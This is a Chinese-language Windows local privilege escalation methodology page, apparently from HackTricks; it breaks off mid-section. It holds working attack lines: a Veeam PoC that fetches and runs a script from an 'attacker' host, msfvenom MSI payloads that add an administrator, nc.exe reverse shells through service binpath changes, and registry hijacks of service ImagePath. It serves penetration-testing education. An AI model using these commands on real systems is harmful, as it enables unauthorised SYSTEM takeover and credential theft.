# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **查找 Windows local privilege escalation 向量的最佳工具：** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Windows 基础理论

### Access Tokens

**如果你不知道什么是 Windows Access Tokens，请在继续之前阅读以下页面：**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**有关 ACLs - DACLs/SACLs/ACEs 的更多信息，请查看以下页面：**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**如果你不知道 Windows 中的 integrity levels 是什么，你应该在继续之前阅读以下页面：**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows 中存在不同的东西，可能会 **阻止你枚举系统**、运行可执行文件，甚至 **检测你的活动**。在开始 privilege escalation 枚举之前，你应该 **阅读** 以下 **页面** 并 **枚举** 所有这些 **防御** **机制**：


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

通过 `RAiLaunchAdminProcess` 启动的 UIAccess 进程在 AppInfo secure-path 检查被绕过时可以被滥用以在无需提示的情况下达到 High IL。请查看此处专门的 UIAccess/Admin Protection 绕过 工作流程：

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop 可访问性注册表传播可以被滥用以进行任意 SYSTEM 注册表写入（RegPwn）：

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

## System Info

### Version info enumeration

检查 Windows 版本是否存在已知漏洞（也要检查已安装的补丁）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### 版本漏洞利用

This [site](https://msrc.microsoft.com/update-guide/vulnerability) is handy for searching out detailed information about Microsoft security vulnerabilities. This database has more than 4,700 security vulnerabilities, showing the **巨大的攻击面** that a Windows environment presents.

**在系统上**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas 中嵌入了 watson)_

**在本地（使用系统信息）**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github 漏洞利用仓库：**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 环境

是否有任何凭证/敏感信息保存在环境变量中？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell 历史记录
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript 文件

你可以在 [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) 学习如何启用它。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell 管道执行的详细信息会被记录，包括已执行的命令、命令调用以及脚本的片段。然而，完整的执行细节和输出结果可能无法被捕获。

要启用此功能，请按照文档中 "Transcript files" 部分的说明操作，选择 **"Module Logging"** 而不是 **"Powershell Transcription"**。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
要查看 PowersShell 日志的最后 15 条事件，可以执行：
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

会捕获脚本执行的完整活动和内容记录，确保每个代码块在运行时都被记录。此过程保留了每项活动的全面审计痕迹，对于取证和分析恶意行为非常有价值。通过在执行时记录所有活动，可以提供对该过程的详细洞察。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block 的日志事件可以在 Windows 事件查看器的以下路径找到：**Application and Services Logs > Microsoft > Windows > PowerShell > Operational**。\
要查看最近 20 条事件，可以使用：
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### 互联网设置
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### 驱动器
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

如果更新不是使用 http**S** 而是使用 http 请求，你可以攻陷该系统。

首先通过在 cmd 中运行以下命令来检查网络是否使用非 SSL 的 WSUS 更新：
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
或者在 PowerShell 中执行以下命令：
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
如果你收到如下回复：
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.

In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, this is the flaw that this bug exploits:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

许多企业 agent 会暴露一个 localhost IPC 界面和一个拥有权限的更新通道。如果能够将注册登记强制指向攻击者控制的服务器，且 updater 信任一个伪造的 root CA 或者签名验证薄弱，本地用户就可以交付一个恶意 MSI，由 SYSTEM 服务安装。基于 Netskope stAgentSvc 链（CVE-2025-0309）的通用方法见：

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` 在 **TCP/9401** 上暴露了一个 localhost 服务，该服务会处理攻击者控制的消息，从而允许以 **NT AUTHORITY\SYSTEM** 身份执行任意命令。

- **侦察**: 确认监听端口和版本，例如： `netstat -ano | findstr 9401` 和 `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`。
- **利用**: 将一个 PoC（例如 `VeeamHax.exe`）和所需的 Veeam DLL 放在同一目录，然后通过本地 socket 触发一个以 SYSTEM 身份运行的 payload：
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
该服务以 SYSTEM 身份执行命令。

## KrbRelayUp

在 Windows **domain** 环境中，在特定条件下存在一个 **local privilege escalation** 漏洞。 这些条件包括环境中**LDAP signing is not enforced,** 用户具有允许他们配置 **Resource-Based Constrained Delegation (RBCD)** 的 self-rights，并且用户能够在域内创建计算机。需要注意的是，这些 **requirements** 在 **default settings** 下会被满足。

在 [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) 可找到该 **exploit**。

有关攻击流程的更多信息，请查看 [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

如果这两个注册表项被启用（值为 **0x1**），那么任何权限的用户都可以以 NT AUTHORITY\\**SYSTEM** 身份安装（执行）`*.msi` 文件。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
如果你有一个 meterpreter 会话，你可以使用模块 **`exploit/windows/local/always_install_elevated`** 来自动化此技术。

### PowerUP

使用来自 power-up 的 `Write-UserAddMSI` 命令在当前目录中创建一个用于提升权限的 Windows MSI 二进制文件。该脚本写出一个预编译的 MSI 安装程序，提示添加用户/组（所以你将需要 GIU 访问）：
```
Write-UserAddMSI
```
只需执行创建的二进制文件即可提升权限。

### MSI Wrapper

阅读此教程以了解如何使用这些工具创建 MSI wrapper。请注意，如果您**只是**想**执行****命令行**，可以将 **.bat** 文件打包。

{{#ref}}
msi-wrapper.md
{{#endref}}

### 使用 WIX 创建 MSI


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### 使用 Visual Studio 创建 MSI

- **生成** 使用 Cobalt Strike 或 Metasploit 在 `C:\privesc\beacon.exe` 生成一个 **新的 Windows EXE TCP payload**
- 打开 **Visual Studio**，选择 **Create a new project**，在搜索框中输入 "installer"。选择 **Setup Wizard** 项目并点击 **Next**。
- 为项目命名，例如 **AlwaysPrivesc**，将位置设置为 **`C:\privesc`**，选择 **place solution and project in the same directory**，然后点击 **Create**。
- 不断点击 **Next** 直到到达第 3 步（选择要包含的文件）。点击 **Add** 并选择刚才生成的 Beacon payload。然后点击 **Finish**。
- 在 **Solution Explorer** 中选中 **AlwaysPrivesc** 项目，在 **Properties** 中将 **TargetPlatform** 从 **x86** 改为 **x64**。
- 还有其他属性可以修改，例如 **Author** 和 **Manufacturer**，这可以让安装的应用看起来更合法。
- 右键项目并选择 **View > Custom Actions**。
- 右键 **Install** 并选择 **Add Custom Action**。
- 双击 **Application Folder**，选择你的 **beacon.exe** 文件并点击 **OK**。这将确保安装程序运行时立即执行 beacon payload。
- 在 **Custom Action Properties** 下，将 **Run64Bit** 改为 **True**。
- 最后，**构建**。
- 如果出现警告 `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`，请确保已将平台设置为 x64。

### MSI 安装

要在后台执行恶意 `.msi` 文件的**安装**：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
要利用此漏洞可以使用: _exploit/windows/local/always_install_elevated_

## 防病毒和检测器

### 审计设置

这些设置决定哪些内容会被**记录**，因此你应该注意。
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding，了解日志发送到何处很有趣
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** 的设计目标在于 **本地 Administrator 密码的管理**，确保加入域的计算机上的每个密码都是**唯一、随机生成并定期更新**的。这些密码安全地存储在 Active Directory 中，仅能被通过 ACLs 授予了足够权限的用户访问，授权用户可在需要时查看本地 Administrator 密码。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

如果启用，**明文密码会存储在 LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

从 **Windows 8.1** 开始，Microsoft 引入了对 Local Security Authority (LSA) 的增强保护，以 **阻止** 不受信任进程尝试 **读取其内存** 或注入代码，从而进一步保护系统。\
[**有关 LSA Protection 的更多信息请见**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** 是在 **Windows 10** 中引入的。它的目的是保护设备上存储的凭据，免受像 pass-the-hash 这类攻击的威胁。| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** 由 **Local Security Authority** (LSA) 验证，并被操作系统组件使用。 当用户的登录数据被已注册的安全包验证后，通常会为该用户建立 domain credentials。\
[**更多关于 Cached Credentials 的信息**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## 用户与组

### 枚举用户和组

你应该检查你所属的组是否具有可被利用的权限
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特权组

如果你 **属于某个特权组，你可能能够提升权限**。在这里了解特权组以及如何滥用它们以提升权限：


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token 操作

**了解更多** 关于 **token** 的信息，请查看此页面: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
查看以下页面以 **了解有趣的 token** 及如何滥用它们：


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### 已登录用户 / 会话
```bash
qwinsta
klist sessions
```
### 主目录
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### 密码策略
```bash
net accounts
```
### 获取剪贴板内容
```bash
powershell -command "Get-Clipboard"
```
## 运行的进程

### 文件和文件夹权限

首先，列出进程并**检查进程命令行中是否包含密码**。\
检查是否可以**覆盖某个正在运行的 binary**，或是否对 binary 文件夹具有写权限，以便利用可能的 [**DLL Hijacking attacks**](dll-hijacking/index.html)：
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
始终检查是否存在[**electron/cef/chromium debuggers** 正在运行，你可以滥用它来提升权限](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**检查进程二进制文件的权限**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**检查进程二进制文件所在文件夹的权限 (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

你可以使用来自 sysinternals 的 **procdump** 对正在运行的进程创建内存转储。像 FTP 这样的服务会在内存中以明文保存 **credentials**，尝试转储内存并读取这些 credentials。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 不安全的 GUI 应用

**以 SYSTEM 身份运行的应用程序可能允许用户生成 CMD，或浏览目录。**

示例：在 "Windows Help and Support" (Windows + F1) 中搜索 "command prompt"，然后点击 "Click to open Command Prompt"

## 服务

Service Triggers 允许 Windows 在特定条件发生时启动服务（named pipe/RPC endpoint 活动、ETW 事件、IP 可用性、设备到达、GPO 刷新等）。即使没有 SERVICE_START 权限，你通常也可以通过触发这些 triggers 来启动有特权的服务。查看枚举和激活技术：

-
{{#ref}}
service-triggers.md
{{#endref}}

获取服务列表：
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 权限

你可以使用 **sc** 获取有关服务的信息
```bash
sc qc <service_name>
```
建议使用来自 _Sysinternals_ 的二进制文件 **accesschk** 来检查每个服务所需的权限级别。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
建议检查是否 "Authenticated Users" 可以修改任何服务：
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### 启用服务

如果你遇到此错误（例如对 SSDPSRV）：

_发生了系统错误 1058。_\  
_该服务无法启动，可能因为它被禁用或未关联任何已启用的设备。_

你可以使用以下命令启用它：
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**请注意，服务 upnphost 依赖 SSDPSRV 才能工作（适用于 XP SP1）**

**该问题的另一种解决方法是运行：**
```
sc.exe config usosvc start= auto
```
### **修改服务二进制路径**

在 "Authenticated users" 组对某个服务拥有 **SERVICE_ALL_ACCESS** 的情况下，可以修改该服务的可执行二进制文件。要修改并执行 **sc**：
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### 重启服务
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
提权可以通过以下权限实现：

- **SERVICE_CHANGE_CONFIG**：允许重新配置服务二进制文件。
- **WRITE_DAC**：允许重新配置权限，从而能够更改服务配置。
- **WRITE_OWNER**：允许获取所有权并重新配置权限。
- **GENERIC_WRITE**：同样具有更改服务配置的能力。
- **GENERIC_ALL**：也具有更改服务配置的能力。

要检测和利用此漏洞，可使用 _exploit/windows/local/service_permissions_。

### 服务二进制文件弱权限

**检查是否可以修改由服务执行的二进制文件** 或者是否对二进制所在的文件夹具有 **写权限** ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
你可以使用 **wmic**（不在 system32 中）获取每个由服务执行的二进制文件，并使用 **icacls** 检查你的权限：
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
你也可以使用 **sc** 和 **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Services registry modify permissions

你应该检查是否可以修改任何 service **registry**.\
你可以通过以下操作**check**你对某个 service **registry** 的**permissions**：
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
应该检查 **Authenticated Users** 或 **NT AUTHORITY\INTERACTIVE** 是否拥有 `FullControl` 权限。如果是，服务执行的二进制文件可以被更改。

要更改所执行二进制文件的路径：
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

一些 Windows Accessibility 功能会为每个用户创建 **ATConfig** 键，然后由 **SYSTEM** 进程复制到 HKLM 会话键。注册表的 **符号链接竞争** 可以将该特权写入重定向到 **任意 HKLM 路径**，从而获得任意 HKLM **值写入** 能力。

关键位置（示例：On-Screen Keyboard `osk`）:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` 列出已安装的 accessibility 功能。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` 存储用户可控的配置。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` 在登录/安全桌面（logon/secure-desktop）切换期间创建，且用户可写。

滥用流程 (CVE-2026-24291 / ATConfig):

1. 填充你希望由 SYSTEM 写入的 **HKCU ATConfig** 值。
2. 触发安全桌面的复制（例如 **LockWorkstation**），这会启动 AT broker 流程。
3. 通过在 `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` 上放置一个 **oplock** 来 **赢得竞争**；当 oplock 触发时，将 **HKLM Session ATConfig** 键替换为指向受保护 HKLM 目标的 **注册表符号链接**。
4. SYSTEM 将攻击者选择的值写入被重定向的 HKLM 路径。

一旦获得任意 HKLM 值写入，就可以通过覆盖服务配置值来转向 LPE：

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

选择一个普通用户可以启动的服务（例如 **`msiserver`**），并在写入后触发它。注意：公开的 exploit 实现会在竞争过程中**锁定工作站**。

示例工具（RegPwn BOF / standalone）：
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

如果你对某个 registry 拥有此权限，意味着**你可以从该 registry 创建子注册表项**。在 Windows services 的情况下，这**足以执行任意代码：**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### 未加引号的服务路径

如果可执行文件的路径没有用引号括起来，Windows 会尝试执行路径中每个空格前的部分。

例如，对于路径 _C:\Program Files\Some Folder\Service.exe_，Windows 会尝试执行：
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
列出所有未加引号的服务路径（排除属于内置 Windows 服务的）：
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**你可以使用 metasploit 检测并利用** 这个漏洞： `exploit/windows/local/trusted\_service\_path` 你可以手动使用 metasploit 创建服务二进制文件：
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 恢复操作

Windows 允许用户指定在服务失败时要采取的操作。此功能可以配置为指向一个二进制文件。如果此二进制文件可以被替换，可能会发生 privilege escalation。更多细节可以在 [官方文档](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) 中找到。

## 应用程序

### 已安装的应用程序

检查 **二进制文件的权限**（也许你可以覆盖其中一个并可能实现 privilege escalation）以及 **文件夹**（[DLL Hijacking](dll-hijacking/index.html)）。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 写入权限

检查你是否可以修改某个配置文件以读取某个特殊文件，或是否可以修改将由 Administrator 账户执行的某个二进制文件 (schedtasks)。

一种在系统中查找弱目录/文件权限的方法是执行：
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ 会在其 `plugins` 子文件夹下自动加载任何 plugin DLL。如果存在可写的便携/复制安装，放置一个恶意插件会在每次启动时在 `notepad++.exe` 内自动执行代码（包括来自 `DllMain` 和 plugin callbacks）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**检查是否可以覆盖将由不同用户执行的一些 registry 或 binary。**\
**阅读** **下面的页面** 以了解有关有趣的 **autoruns locations to escalate privileges** 的更多信息：


{{#ref}}
